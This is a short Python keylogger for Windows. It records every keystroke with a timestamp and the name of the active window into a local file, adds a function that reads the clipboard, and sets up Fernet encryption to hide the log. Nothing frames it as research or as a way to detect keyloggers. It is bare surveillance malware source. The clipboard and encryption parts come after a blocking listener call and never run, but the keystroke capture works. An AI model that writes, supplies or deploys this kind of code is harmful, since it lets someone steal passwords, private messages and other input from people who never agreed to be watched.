from pynput import keyboard
from datetime import datetime
from cryptography.fernet import Fernet
import win32gui
import win32clipboard

log_file = "Keylog.txt"

def get_active_window():
    window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    return window if window else "Unknown Window"

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    window = get_active_window()
    try:
        log = f"{timestamp} | {window} | {key.char}\n"
    except AttributeError:
        log = f"{timestamp} | {window} | [{key}]\n"
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(log)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except:
        return "Clipboard Access Failed"

# Generate this once, store it securely
key = Fernet.generate_key()
cipher = Fernet(key)

def encrypt_log(text):
    return cipher.encrypt(text.encode()).decode()

# Use encrypt_log(log) before saving to file